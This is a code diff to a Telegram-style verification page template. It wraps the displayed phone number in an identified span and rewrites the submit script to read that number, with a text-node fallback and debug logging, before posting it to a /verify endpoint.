@@ -8,7 +8,7 @@
     <button onclick="window.location.href='/login'" style="position: absolute; left: 24px; top: 24px; background: none; border: none; color: #A0A0A0; font-size: 18px; cursor: pointer;">&larr;</button>
     <div style="font-size: 64px; margin-bottom: 18px;">🐵</div>
     <div style="font-size: 19px; color: #fff; font-weight: 500; margin-bottom: 2px; display: flex; align-items: center; gap: 6px;">
-      {{ phone_number }}
+      <span id="phoneNumber">{{ phone_number }}</span>
       <span style="font-size: 16px; color: #A0A0A0; cursor: pointer;" onclick="history.back()">&#9998;</span>
     </div>
     <div style="font-size: 15px; color: #A0A0A0; text-align: center; margin-bottom: 24px;">We have sent you a message in Telegram with the code.</div>
@@ -37,8 +37,28 @@ verifyForm.addEventListener('submit', async function(e) {
   btn.textContent = 'Verifying...';
   try {
     // Get phone number from the displayed text
-    const phoneNumberElement = document.querySelector('div[style*="font-size: 19px"]');
-    const phoneNumber = phoneNumberElement ? phoneNumberElement.textContent.trim() : '';
+    const phoneNumberElement = document.getElementById('phoneNumber');
+    console.log('Phone number element:', phoneNumberElement);
+    let phoneNumber = '';
+    
+    if (phoneNumberElement) {
+      phoneNumber = phoneNumberElement.textContent.trim();
+      console.log('Extracted phone number:', phoneNumber);
+    } else {
+      console.log('Phone number element not found, trying alternative method');
+      // Fallback: try to get from the first text node in the div
+      const phoneDiv = document.querySelector('div[style*="font-size: 19px"]');
+      if (phoneDiv) {
+        // Get the first text node (should be the phone number)
+        const textNodes = Array.from(phoneDiv.childNodes).filter(node => node.nodeType === Node.TEXT_NODE);
+        if (textNodes.length > 0) {
+          phoneNumber = textNodes[0].textContent.trim();
+          console.log('Fallback phone number:', phoneNumber);
+        }
+      }
+    }
+    
+    console.log('Final phone number being sent:', phoneNumber);
     
     const response = await fetch('/verify', {
       method: 'POST',
